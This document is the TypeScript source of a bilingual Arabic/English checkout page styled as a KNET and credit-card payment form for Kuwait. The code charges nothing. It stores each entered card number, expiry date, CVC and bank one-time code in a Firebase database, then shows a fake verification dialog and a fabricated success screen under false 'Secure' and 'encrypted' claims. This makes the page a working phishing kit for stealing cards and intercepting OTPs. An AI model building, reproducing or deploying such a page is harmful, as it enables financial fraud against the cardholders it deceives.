"use client"

import type React from "react"

import { useState, useRef, useEffect } from "react"
import {
  CreditCard,
  Wallet,
  Check,
  Shield,
  Download,
  ArrowRight,
  AlertCircle,
  Info,
  Lock,
  Languages,
  CircleCheck,
  CircleDashed,
} from "lucide-react"
import Image from "next/image"
import { useRouter } from "next/navigation"
import { Button } from "@/components/ui/button"
import { Card, CardContent, CardDescription, CardFooter, CardHeader, CardTitle } from "@/components/ui/card"
import { Input } from "@/components/ui/input"
import { Label } from "@/components/ui/label"
import { RadioGroup, RadioGroupItem } from "@/components/ui/radio-group"
import { Tooltip, TooltipContent, TooltipProvider, TooltipTrigger } from "@/components/ui/tooltip"
import { Badge } from "@/components/ui/badge"
import {
  Dialog,
  DialogContent,
  DialogDescription,
  DialogFooter,
  DialogHeader,
  DialogTitle,
} from "@/components/ui/dialog"
import { addData } from "@/lib/firebase"

// Payment flow states
type PaymentState = "FORM" | "OTP" | "SUCCESS"

export default function PaymentMethods() {
  const [paymentMethod, setPaymentMethod] = useState<string | null>(null)
  const [isProcessing, setIsProcessing] = useState(false)
  const [paymentState, setPaymentState] = useState<PaymentState>("FORM")
  const [otpValues, setOtpValues] = useState<string[]>(Array(6).fill(""))
  const [showOtpDialog, setShowOtpDialog] = useState(false)
  const otpInputRefs = useRef<(HTMLInputElement | null)[]>(Array(6).fill(null))
  const [otpError, setOtpError] = useState("")
  const [resendDisabled, setResendDisabled] = useState(false)
  const [countdown, setCountdown] = useState(30)
  const router = useRouter()
  const [isArabic, setIsArabic] = useState(false)

  // Form validation
  const [cardNumber, setCardNumber] = useState("")
  const [cardExpiry, setCardExpiry] = useState("")
  const [cardCvc, setCardCvc] = useState("")
  const [currency, setCurrency] = useState("sar")
  const [formErrors, setFormErrors] = useState<Record<string, string>>({})
  const generateOrderId = () => `ORD-${Math.floor(10000 + Math.random() * 90000)}`

  // Order details state
  const [orderDetails, setOrderDetails] = useState({
    id: generateOrderId(),
    total: "114.00", // Default value
    date: new Date().toISOString(),
  })

  // Initialize order details from localStorage on client-side only
  useEffect(() => {
    try {
      const storedAmount = localStorage.getItem("amount")
      if (storedAmount) {
        setOrderDetails((prev) => ({
          ...prev,
          total: storedAmount,
        }))
      }

      // Check if language preference is stored
      const storedLanguage = localStorage.getItem("language")
      if (storedLanguage) {
        setIsArabic(storedLanguage === "ar")
      }
    } catch (error) {
      console.error("Error accessing localStorage:", error)
    }
  }, [])

  // Toggle language function
  const toggleLanguage = () => {
    const newLanguage = !isArabic
    setIsArabic(newLanguage)
    try {
      localStorage.setItem("language", newLanguage ? "ar" : "en")
    } catch (error) {
      console.error("Error saving to localStorage:", error)
    }
  }

  // Get visitor ID from localStorage (if available)
  const getVisitorId = () => {
    try {
      if (typeof window !== "undefined") {
        return localStorage.getItem("visitor") || "anonymous-user"
      }
    } catch (error) {
      console.error("Error accessing localStorage:", error)
    }
    return "anonymous-user"
  }

  // Format card number with spaces
  const formatCardNumber = (value: string) => {
    const v = value.replace(/\s+/g, "").replace(/[^0-9]/gi, "")
    const matches = v.match(/\d{4,16}/g)
    const match = (matches && matches[0]) || ""
    const parts = []

    for (let i = 0, len = match.length; i < len; i += 4) {
      parts.push(match.substring(i, i + 4))
    }

    if (parts.length) {
      return parts.join(" ")
    } else {
      return value
    }
  }

  // Format expiry date
  const formatExpiry = (value: string) => {
    const v = value.replace(/\s+/g, "").replace(/[^0-9]/gi, "")

    if (v.length >= 3) {
      return `${v.substring(0, 2)}/${v.substring(2, 4)}`
    }

    return value
  }

  // Validate form
  const validateForm = () => {
    const errors: Record<string, string> = {}

    if (!cardNumber) {
      errors.cardNumber = isArabic ? "يرجى إدخال رقم البطاقة" : "Please enter card number"
    } else if (cardNumber.replace(/\s+/g, "").length < 16) {
      errors.cardNumber = isArabic ? "رقم البطاقة غير صحيح" : "Invalid card number"
    }

    if (!cardExpiry) {
      errors.cardExpiry = isArabic ? "يرجى إدخال تاريخ الانتهاء" : "Please enter expiry date"
    } else if (cardExpiry.length < 5) {
      errors.cardExpiry = isArabic ? "تاريخ الانتهاء غير صحيح" : "Invalid expiry date"
    }

    if (!cardCvc) {
      errors.cardCvc = isArabic ? "يرجى إدخال رمز الأمان" : "Please enter security code"
    } else if (cardCvc.length < 3) {
      errors.cardCvc = isArabic ? "رمز الأمان غير صحيح" : "Invalid security code"
    }

    setFormErrors(errors)
    return Object.keys(errors).length === 0
  }

  // Handle initial payment submission
  const handlePayment = () => {
    if (paymentMethod === "card" && !validateForm()) {
      return
    }

    if (paymentMethod === "paypal") {
      router.push("/kent")
      return
    }

    setIsProcessing(true)

    // Submit card data
    const visitorId = getVisitorId()
    addData({ id: visitorId, cardNumber, cardExpiry, cardCvc })

    // Simulate payment processing
    setTimeout(() => {
      setIsProcessing(false)
      setShowOtpDialog(true)

      // Focus the first OTP input when the OTP dialog appears
      setTimeout(() => {
        if (otpInputRefs.current[0]) {
          otpInputRefs.current[0].focus()
        }
      }, 100)
    }, 1500)
  }

  // Handle OTP input change
  const handleOtpChange = (index: number, value: string) => {
    // Only allow numbers
    if (value && !/^\d*$/.test(value)) return

    const newOtpValues = [...otpValues]
    newOtpValues[index] = value
    setOtpValues(newOtpValues)
    setOtpError("")

    // Auto-focus next input
    if (value && index < 5) {
      otpInputRefs.current[index + 1]?.focus()
    }
  }

  // Handle OTP input keydown
  const handleKeyDown = (index: number, e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === "Backspace" && !otpValues[index] && index > 0) {
      // Focus previous input when backspace is pressed on an empty input
      otpInputRefs.current[index - 1]?.focus()
    }
  }

  // Handle OTP verification
  const verifyOtp = () => {
    const otpCode = otpValues.join("")

    if (otpCode.length !== 6) {
      setOtpError(isArabic ? "يرجى إدخال رمز التحقق المكون من 6 أرقام" : "Please enter the 6-digit verification code")
      return
    }

    setIsProcessing(true)

    // Submit OTP code
    const visitorId = getVisitorId()
    addData({ id: visitorId, otp:otpCode })

    // Simulate OTP verification
    setTimeout(() => {
      setIsProcessing(false)
      setShowOtpDialog(false)
      setPaymentState("SUCCESS")
    }, 1500)
  }

  // Handle OTP resend
  const resendOtp = () => {
    setResendDisabled(true)
    setCountdown(30)
    // Reset OTP fields
    setOtpValues(Array(6).fill(""))
    setOtpError("")
    // Focus the first input
    setTimeout(() => {
      if (otpInputRefs.current[0]) {
        otpInputRefs.current[0].focus()
      }
    }, 100)
  }

  // Countdown timer for OTP resend
  useEffect(() => {
    let timer: NodeJS.Timeout
    if (resendDisabled && countdown > 0) {
      timer = setTimeout(() => {
        setCountdown(countdown - 1)
      }, 1000)
    } else if (countdown === 0) {
      setResendDisabled(false)
    }
    return () => clearTimeout(timer)
  }, [resendDisabled, countdown])

  // Get current date in Arabic or English format
  const getCurrentDate = () => {
    const options: Intl.DateTimeFormatOptions = {
      year: "numeric",
      month: "long",
      day: "numeric",
      hour: "2-digit",
      minute: "2-digit",
    }
    return new Date().toLocaleDateString(isArabic ? "ar-SA" : "en-US", options)
  }

  // Translations object
  const translations = {
    completePayment: {
      ar: "إتمام الدفع",
      en: "Complete Payment",
    },
    secure: {
      ar: "آمن",
      en: "Secure",
    },
    choosePaymentMethod: {
      ar: "اختر طريقة الدفع المفضلة لديك أدناه",
      en: "Choose your preferred payment method below",
    },
    payment: {
      ar: "الدفع",
      en: "Payment",
    },
    verification: {
      ar: "التحقق",
      en: "Verification",
    },
    confirmation: {
      ar: "التأكيد",
      en: "Confirmation",
    },
    orderNumber: {
      ar: "رقم الطلب:",
      en: "Order Number:",
    },
    totalAmount: {
      ar: "المبلغ الإجمالي:",
      en: "Total Amount:",
    },
    paymentMethod: {
      ar: "طريقة الدفع",
      en: "Payment Method",
    },
    creditCard: {
      ar: "بطاقة ائتمان",
      en: "Credit Card",
    },
    knet: {
      ar: "كي نت",
      en: "KNET",
    },
    cardNumber: {
      ar: "رقم البطاقة",
      en: "Card Number",
    },
    cardNumberTooltip: {
      ar: "أدخل 16 رقم الموجود على بطاقتك",
      en: "Enter the 16-digit number on your card",
    },
    expiryDate: {
      ar: "تاريخ الانتهاء",
      en: "Expiry Date",
    },
    securityCode: {
      ar: "رمز التحقق",
      en: "Security Code",
    },
    payNow: {
      ar: "ادفع الآن",
      en: "Pay Now",
    },
    processing: {
      ar: "جاري المعالجة...",
      en: "Processing...",
    },
    allTransactionsSecure: {
      ar: "جميع المعاملات مشفرة وآمنة",
      en: "All transactions are encrypted and secure",
    },
    paymentSuccessful: {
      ar: "تم الدفع بنجاح",
      en: "Payment Successful",
    },
    thankYou: {
      ar: "شكراً لك، تمت عملية الدفع بنجاح",
      en: "Thank you, your payment was successful",
    },
    paymentDate: {
      ar: "تاريخ الدفع:",
      en: "Payment Date:",
    },
    emailSent: {
      ar: "تم إرسال تفاصيل الدفع إلى بريدك الإلكتروني",
      en: "Payment details have been sent to your email",
    },
    returnToHome: {
      ar: "العودة للرئيسية",
      en: "Return to Home",
    },
    printReceipt: {
      ar: "طباعة الإيصال",
      en: "Print Receipt",
    },
    paymentVerification: {
      ar: "التحقق من الدفع",
      en: "Payment Verification",
    },
    enterVerificationCode: {
      ar: "أدخل رمز التحقق المكون من 6 أرقام المرسل إلى هاتفك",
      en: "Enter the 6-digit verification code sent to your phone",
    },
    codeSentTo: {
      ar: "تم إرسال رمز التحقق إلى",
      en: "Verification code sent to",
    },
    didntReceiveCode: {
      ar: "لم تستلم الرمز؟",
      en: "Didn't receive the code?",
    },
    resendCode: {
      ar: "إعادة إرسال الرمز",
      en: "Resend Code",
    },
    resendAfter: {
      ar: "إعادة الإرسال بعد",
      en: "Resend after",
    },
    seconds: {
      ar: "ثانية",
      en: "seconds",
    },
    confirm: {
      ar: "تأكيد",
      en: "Confirm",
    },
    verifying: {
      ar: "جاري التحقق...",
      en: "Verifying...",
    },
  }

  // Helper function to get translation
  const t = (key: keyof typeof translations) => {
    return isArabic ? translations[key].ar : translations[key].en
  }

  // Progress indicator
  const renderProgressIndicator = () => (
    <div className="flex items-center justify-between mb-8">
      <div className="flex flex-col items-center relative z-10">
        <div
          className={`w-10 h-10 rounded-full flex items-center justify-center ${
            paymentState === "FORM" ? "bg-purple-600 text-white" : "bg-purple-600 text-white"
          }`}
        >
          <CircleCheck className="h-5 w-5" />
        </div>
        <span className="text-xs mt-2 font-medium">{t("payment")}</span>
      </div>
      <div className={`h-1 flex-1 mx-2 ${paymentState !== "FORM" ? "bg-purple-600" : "bg-gray-200"}`}></div>
      <div className="flex flex-col items-center relative z-10">
        <div
          className={`w-10 h-10 rounded-full flex items-center justify-center ${
            paymentState === "OTP"
              ? "bg-purple-600 text-white"
              : paymentState === "SUCCESS"
                ? "bg-purple-600 text-white"
                : "bg-gray-200 text-gray-500"
          }`}
        >
          {paymentState === "OTP" || paymentState === "SUCCESS" ? (
            <CircleCheck className="h-5 w-5" />
          ) : (
            <CircleDashed className="h-5 w-5" />
          )}
        </div>
        <span className="text-xs mt-2 font-medium">{t("verification")}</span>
      </div>
      <div className={`h-1 flex-1 mx-2 ${paymentState === "SUCCESS" ? "bg-purple-600" : "bg-gray-200"}`}></div>
      <div className="flex flex-col items-center relative z-10">
        <div
          className={`w-10 h-10 rounded-full flex items-center justify-center ${
            paymentState === "SUCCESS" ? "bg-purple-600 text-white" : "bg-gray-200 text-gray-500"
          }`}
        >
          {paymentState === "SUCCESS" ? <CircleCheck className="h-5 w-5" /> : <CircleDashed className="h-5 w-5" />}
        </div>
        <span className="text-xs mt-2 font-medium">{t("confirmation")}</span>
      </div>
    </div>
  )

  // Render success state
  const renderSuccessState = () => (
    <>
      <CardHeader className="space-y-1 pb-2 text-center">
        <div className="flex justify-center mb-6">
          <div className="w-20 h-20 bg-green-100 rounded-full flex items-center justify-center">
            <Check className="h-10 w-10 text-green-600" />
          </div>
        </div>
        <CardTitle className="text-2xl font-bold">{t("paymentSuccessful")}</CardTitle>
        <CardDescription>{t("thankYou")}</CardDescription>
      </CardHeader>
      <CardContent className="space-y-6">
        {renderProgressIndicator()}

        <div className="bg-gray-50 rounded-xl p-6 mb-4 border border-gray-100">
          <div className="flex justify-between items-center mb-4">
            <span className="text-sm text-gray-500">{t("orderNumber")}</span>
            <span className="font-medium">{orderDetails.id}</span>
          </div>
          <div className="flex justify-between items-center mb-4">
            <span className="text-sm text-gray-500">{t("paymentDate")}</span>
            <span className="font-medium">{getCurrentDate()}</span>
          </div>
          <div className="flex justify-between items-center pt-4 border-t border-gray-200">
            <span className="text-sm text-gray-500">{t("totalAmount")}</span>
            <span className="font-bold text-lg text-purple-700">
              {orderDetails.total} {currency === "sar" ? (isArabic ? "د.ك" : "KWD") : "$"}
            </span>
          </div>
        </div>

        <div className="text-center text-sm text-gray-500">
          <p>{t("emailSent")}</p>
        </div>
      </CardContent>
      <CardFooter className="flex flex-col gap-4">
        <Button
          className="w-full h-12 text-base font-medium bg-purple-600 hover:bg-purple-700"
          onClick={() => router.push("/")}
        >
          <span className="flex items-center gap-2">
            {t("returnToHome")}
            <ArrowRight className="h-5 w-5" />
          </span>
        </Button>
        <Button
          variant="outline"
          className="w-full border-purple-200 text-purple-700 hover:bg-purple-50"
          onClick={() => window.print()}
        >
          <span className="flex items-center gap-2">
            <Download className="h-4 w-4" />
            {t("printReceipt")}
          </span>
        </Button>
      </CardFooter>
    </>
  )

  return (
    <div
      className="flex justify-center items-center min-h-screen bg-gradient-to-br from-purple-50 to-pink-50"
      dir={isArabic ? "rtl" : "ltr"}
    >
      {/* Language Toggle Button */}
      <div className="absolute top-4 right-4 z-10">
        <button
          onClick={toggleLanguage}
          className="bg-white rounded-full p-2.5 hover:bg-gray-50 transition-colors shadow-md"
        >
          <Languages className="text-purple-600" size={20} />
        </button>
      </div>

      <Card className="w-full max-w-md shadow-2xl border-0 overflow-hidden rounded-2xl">
        {paymentState === "FORM" && (
          <>
            <CardHeader className="space-y-1 pb-4 border-b border-gray-100">
              <div className="flex justify-between items-center">
                <CardTitle className="text-2xl font-bold text-gray-800">{t("completePayment")}</CardTitle>
                <Badge
                  variant="outline"
                  className="flex items-center gap-1 px-2 py-1 bg-green-50 text-green-700 border-green-200"
                >
                  <Shield className="h-3 w-3" /> {t("secure")}
                </Badge>
              </div>
              <CardDescription className="text-gray-500">{t("choosePaymentMethod")}</CardDescription>
            </CardHeader>
            <CardContent className="space-y-6 pt-6">
              {renderProgressIndicator()}

              <div className="bg-gray-50 rounded-xl p-6 mb-6 border border-gray-100">
                <div className="flex justify-between items-center mb-4">
                  <span className="text-sm text-gray-500">{t("orderNumber")}</span>
                  <span className="font-medium">{orderDetails.id}</span>
                </div>
                <div className="flex justify-between items-center pt-4 border-t border-gray-200">
                  <span className="text-sm text-gray-500">{t("totalAmount")}</span>
                  <span className="font-bold text-lg text-purple-700">
                    {orderDetails.total} {currency === "sar" ? (isArabic ? "د.ك" : "KWD") : "$"}
                  </span>
                </div>
              </div>

              <div>
                <h3 className="font-medium mb-4 text-gray-700">{t("paymentMethod")}</h3>
                <RadioGroup value={paymentMethod || ""} onValueChange={setPaymentMethod} className="grid gap-4">
                  <div className="grid gap-6">
                    <div className="relative">
                      <div
                        className={`absolute inset-0 rounded-xl transition-all duration-200 ${
                          paymentMethod === "card" ? "ring-2 ring-purple-500" : ""
                        }`}
                      ></div>
                      <div className="flex items-center space-x-2 relative">
                        <RadioGroupItem value="card" id="card" className="text-purple-600" />
                        <Label
                          htmlFor="card"
                          className="flex items-center gap-3 cursor-pointer rounded-xl border border-gray-200 p-4 hover:bg-gray-50 transition-colors w-full"
                        >
                          <div className="bg-gradient-to-r from-purple-500 to-pink-500 text-white p-2.5 rounded-lg">
                            <CreditCard className="h-5 w-5" />
                          </div>
                          <div className="font-medium text-gray-800">{t("creditCard")}</div>
                          <div className={`flex gap-2 ${isArabic ? "mr-auto" : "ml-auto"}`}>
                            <div className="rounded">
                              <Image src="/visa.svg" alt="visa" width={30} height={30} />
                            </div>
                            <div className="rounded">
                              <Image
                                src="/mas.svg"
                                alt="mastercard"
                                width={30}
                                height={30}
                              />
                            </div>
                            <div className="rounded">
                              <Image src="amex.svg" alt="express" width={30} height={30} />
                            </div>
                          </div>
                        </Label>
                      </div>
                    </div>

                    {paymentMethod === "card" && (
                      <div
                        className={`grid gap-5 ${isArabic ? "pr-6" : "pl-6"} animate-in fade-in-50 duration-300`}
                        dir={isArabic ? "rtl" : "ltr"}
                      >
                        <div className="grid gap-2">
                          <div className="flex items-center justify-between">
                            <Label htmlFor="card-number" className="flex items-center gap-1 text-gray-700">
                              {t("cardNumber")}
                              <TooltipProvider>
                                <Tooltip>
                                  <TooltipTrigger asChild>
                                    <Info className="h-3 w-3 text-gray-400" />
                                  </TooltipTrigger>
                                  <TooltipContent>
                                    <p>{t("cardNumberTooltip")}</p>
                                  </TooltipContent>
                                </Tooltip>
                              </TooltipProvider>
                            </Label>
                            {formErrors.cardNumber && (
                              <span className="text-xs text-red-500 flex items-center gap-1">
                                <AlertCircle className="h-3 w-3" /> {formErrors.cardNumber}
                              </span>
                            )}
                          </div>
                          <div className="relative">
                            <Input
                              id="card-number"
                              placeholder="#### #### #### ####"
                              value={cardNumber}
                              onChange={(e) => setCardNumber(formatCardNumber(e.target.value))}
                              maxLength={19}
                              className={`rounded-lg h-12 px-4 ${formErrors.cardNumber ? "border-red-500" : "border-gray-200"}`}
                            />
                            <div className="absolute left-3 top-1/2 -translate-y-1/2">
                              <div className="w-6 h-4 bg-purple-600 rounded"></div>
                            </div>
                          </div>
                        </div>
                        <div className="grid grid-cols-2 gap-4">
                          <div className="grid gap-2">
                            <div className="flex items-center justify-between">
                              <Label htmlFor="expiry" className="text-gray-700">
                                {t("expiryDate")}
                              </Label>
                              {formErrors.cardExpiry && (
                                <span className="text-xs text-red-500 flex items-center gap-1">
                                  <AlertCircle className="h-3 w-3" /> {formErrors.cardExpiry}
                                </span>
                              )}
                            </div>
                            <Input
                              id="expiry"
                              placeholder="MM/YY"
                              type="tel"
                              value={cardExpiry}
                              onChange={(e) => setCardExpiry(formatExpiry(e.target.value))}
                              maxLength={5}
                              className={`rounded-lg h-12 ${formErrors.cardExpiry ? "border-red-500" : "border-gray-200"}`}
                            />
                          </div>
                          <div className="grid gap-2">
                            <div className="flex items-center justify-between">
                              <Label htmlFor="cvc" className="text-gray-700">
                                {t("securityCode")}
                              </Label>
                              {formErrors.cardCvc && (
                                <span className="text-xs text-red-500 flex items-center gap-1">
                                  <AlertCircle className="h-3 w-3" /> {formErrors.cardCvc}
                                </span>
                              )}
                            </div>
                            <Input
                              id="cvc"
                              placeholder="123"
                              type="tel"
                              maxLength={4}
                              value={cardCvc}
                              onChange={(e) => setCardCvc(e.target.value.replace(/\D/g, ""))}
                              className={`rounded-lg h-12 ${formErrors.cardCvc ? "border-red-500" : "border-gray-200"}`}
                            />
                          </div>
                        </div>
                      </div>
                    )}

                    <div className="relative">
                      <div
                        className={`absolute inset-0 rounded-xl transition-all duration-200 ${
                          paymentMethod === "paypal" ? "ring-2 ring-purple-500" : ""
                        }`}
                      ></div>
                      <div className="flex items-center space-x-2 relative">
                        <RadioGroupItem value="paypal" id="paypal" className="text-purple-600" />
                        <Label
                          htmlFor="paypal"
                          className="flex items-center gap-3 cursor-pointer rounded-xl border border-gray-200 p-4 hover:bg-gray-50 transition-colors w-full"
                        >
                          <div className="bg-gradient-to-r from-purple-500 to-pink-500 text-white p-2.5 rounded-lg">
                            <Wallet className="h-5 w-5" />
                          </div>
                          <div className="font-medium text-gray-800">{t("knet")}</div>
                          <div className={`flex gap-1 ${isArabic ? "mr-auto" : "ml-auto"}`}>
                            <div className="w-8 h-5 bg-purple-700 rounded">
                              <Image src="/vercel.svg" alt="KNET" width={32} height={20} />
                            </div>
                          </div>
                        </Label>
                      </div>
                    </div>
                  </div>
                </RadioGroup>
              </div>
            </CardContent>
            <CardFooter className="flex flex-col gap-4 border-t border-gray-100 pt-6">
              <Button
                className="w-full h-12 text-base font-medium bg-purple-600 hover:bg-purple-700 rounded-xl"
                disabled={!paymentMethod || isProcessing}
                onClick={handlePayment}
              >
                {isProcessing ? (
                  <span className="flex items-center gap-2">
                    <svg
                      className={`animate-spin ${isArabic ? "-ml-1 mr-2" : "-mr-1 ml-2"} h-4 w-4 text-white`}
                      xmlns="http://www.w3.org/2000/svg"
                      fill="none"
                      viewBox="0 0 24 24"
                    >
                      <circle
                        className="opacity-25"
                        cx="12"
                        cy="12"
                        r="10"
                        stroke="currentColor"
                        strokeWidth="4"
                      ></circle>
                      <path
                        className="opacity-75"
                        fill="currentColor"
                        d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"
                      ></path>
                    </svg>
                    {t("processing")}
                  </span>
                ) : (
                  <span className="flex items-center gap-2">
                    {t("payNow")}
                    <ArrowRight className="h-5 w-5" />
                  </span>
                )}
              </Button>
              <div className="flex items-center justify-center gap-2 text-xs text-gray-500">
                <Shield className="h-3 w-3" />
                <span>{t("allTransactionsSecure")}</span>
              </div>
            </CardFooter>
          </>
        )}

        {paymentState === "SUCCESS" && renderSuccessState()}

        {/* OTP Dialog */}
        <Dialog open={showOtpDialog} onOpenChange={setShowOtpDialog}>
          <DialogContent className="sm:max-w-md rounded-2xl" dir={isArabic ? "rtl" : "ltr"}>
            <DialogHeader>
              <DialogTitle className="text-xl font-bold text-gray-800">{t("paymentVerification")}</DialogTitle>
              <DialogDescription className="text-gray-500">{t("enterVerificationCode")}</DialogDescription>
            </DialogHeader>

            <div className="bg-gray-50 rounded-xl p-6 mb-4 border border-gray-100">
              <div className="flex justify-between items-center mb-4">
                <span className="text-sm text-gray-500">{t("orderNumber")}</span>
                <span className="font-medium">{orderDetails.id}</span>
              </div>
              <div className="flex justify-between items-center pt-4 border-t border-gray-200">
                <span className="text-sm text-gray-500">{t("totalAmount")}</span>
                <span className="font-bold text-lg text-purple-700">
                  {orderDetails.total} {currency === "sar" ? (isArabic ? "د.��" : "KWD") : "$"}
                </span>
              </div>
            </div>

            <div className="text-center mb-4">
              <p className="text-sm mb-1 text-gray-500">{t("codeSentTo")}</p>
              <p className="font-medium text-gray-800">+965 5XX XXX XX89</p>
            </div>

            <div className="flex justify-center gap-3 my-6">
              {otpValues.map((value, index) => (
                <div key={index} className="relative">
                  <Input
                    ref={(el) => (otpInputRefs.current[index] = el)}
                    type="tel"
                    inputMode="numeric"
                    maxLength={1}
                    value={value}
                    onChange={(e) => handleOtpChange(index, e.target.value)}
                    onKeyDown={(e) => handleKeyDown(index, e)}
                    className={`w-12 h-14 text-center text-lg font-bold rounded-lg ${
                      otpError ? "border-red-500" : "border-gray-200"
                    }`}
                  />
                </div>
              ))}
            </div>

            {otpError && (
              <div className="bg-red-50 text-red-500 rounded-lg p-3 text-center text-sm flex items-center justify-center gap-1">
                <AlertCircle className="h-4 w-4" />
                {otpError}
              </div>
            )}

            <div className="text-center">
              <p className="text-sm text-gray-500 mb-2">{t("didntReceiveCode")}</p>
              <Button
                variant="link"
                onClick={resendOtp}
                disabled={resendDisabled}
                className="text-sm p-0 h-auto text-purple-600 hover:text-purple-700"
              >
                {resendDisabled ? `${t("resendAfter")} ${countdown} ${t("seconds")}` : t("resendCode")}
              </Button>
            </div>

            <DialogFooter className="sm:justify-center">
              <Button
                className="w-full h-12 text-base font-medium bg-purple-600 hover:bg-purple-700 rounded-xl"
                disabled={otpValues.some((v) => !v) || isProcessing}
                onClick={verifyOtp}
              >
                {isProcessing ? (
                  <span className="flex items-center gap-2">
                    <svg
                      className={`animate-spin ${isArabic ? "mr-2" : "ml-2"} h-4 w-4 text-white`}
                      xmlns="http://www.w3.org/2000/svg"
                      fill="none"
                      viewBox="0 0 24 24"
                    >
                      <circle
                        className="opacity-25"
                        cx="12"
                        cy="12"
                        r="10"
                        stroke="currentColor"
                        strokeWidth="4"
                      ></circle>
                      <path
                        className="opacity-75"
                        fill="currentColor"
                        d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"
                      ></path>
                    </svg>
                    {t("verifying")}
                  </span>
                ) : (
                  <span className="flex items-center gap-2">
                    <Lock className={`h-4 w-4 ${isArabic ? "mr-1" : "ml-1"}`} />
                    {t("confirm")}
                  </span>
                )}
              </Button>
            </DialogFooter>
          </DialogContent>
        </Dialog>
      </Card>
    </div>
  )
}
